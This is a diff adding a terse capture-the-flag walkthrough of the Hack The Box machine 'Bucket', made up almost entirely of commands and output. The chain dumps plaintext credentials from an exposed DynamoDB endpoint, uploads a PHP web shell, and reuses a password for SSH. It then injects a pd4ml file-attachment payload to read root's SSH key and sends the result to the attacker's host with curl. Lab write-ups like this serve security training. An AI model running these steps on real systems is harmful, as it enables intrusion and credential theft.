@@ -1,0 +1,117 @@
+[*] Found s3.bucket.htb subdomain.
+
+[*] "s3" refers to an AWS bucket.
+
+[*] AWS CLI is required.
+
+[*] limitedeternity$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ | jq -r .
+
+{
+  "TableNames": [
+    "book",
+    "users"
+  ]
+}
+
+[+] limitedeternity$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ | jq -r .
+
+{
+  "Items": [
+    {
+      "password": {
+        "S": "Management@#1@#"
+      },
+      "username": {
+        "S": "Mgmt"
+      }
+    },
+    {
+      "password": {
+        "S": "Welcome123!"
+      },
+      "username": {
+        "S": "Cloudadm"
+      }
+    },
+    {
+      "password": {
+        "S": "n2vM-<_K_Q:.Aa2"
+      },
+      "username": {
+        "S": "Sysadm"
+      }
+    }
+  ],
+  "Count": 3,
+  "ScannedCount": 3,
+  "ConsumedCapacity": null
+}
+
+[*] limitedeternity$ aws s3api list-buckets --endpoint-url http://s3.bucket.htb | jq -r .
+
+{
+  "Buckets": [
+    {
+      "Name": "p0peax",
+      "CreationDate": "2020-10-28T06:53:10.821383+00:00"
+    },
+    {
+      "Name": "adserver",
+      "CreationDate": "2020-10-28T13:47:05.277280+00:00"
+    }
+  ],
+  "Owner": {
+    "DisplayName": "webfile",
+    "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
+  }
+}
+
+[+] limitedeternity$ aws s3api put-object --endpoint-url http://s3.bucket.htb/ --bucket adserver --key shell.php --body shell.php | jq -r .
+
+{
+    "ETag": "\"f2013115840359271c1f3e4661091efa\""
+}
+
+[*] Navigate to: http://bucket.htb/shell.php
+
+[+] p0wny@shell:…/www/html# cat /etc/passwd
+
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+
+[+] limitedeternity$ ssh roy@10.10.10.212
+
+n2vM-<_K_Q:.Aa2
+roy@bucket:~$
+
+[+] Got user.txt!
+
+[*] ~/.viminfo mentions /var/www/bucket-app/vendor/bin/jp.php
+
+> if($_POST["action"]==="get_alerts")
+> $client = new DynamoDbClient
+> 'TableName' => 'alerts',
+> passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf")
+
+[*] roy@bucket:/var/www/bucket-app$ netstat -tulpn | grep LISTEN
+
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN 
+
+[*] limitedeternity$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
+
+<...>
+
+[*] limitedeternity$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url http://s3.bucket.htb
+
+<...>
+
+[*] limitedeternity$ curldrop
+
+[2020-10-28 17:30:38 +0300] [4664] [INFO] Starting gunicorn 19.9.0
+[2020-10-28 17:30:38 +0300] [4664] [INFO] Listening at: http://0.0.0.0:8000 (4664)
+<...>
+
+[*] roy@bucket:/var/www/bucket-app/files$ curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ && curl --upload-file /var/www/bucket-app/files/result.pdf http://10.10.14.85:8000
+
+[+] limitedeternity$ cat 27c64606-result.pdf
+
+[+] Got root.txt!
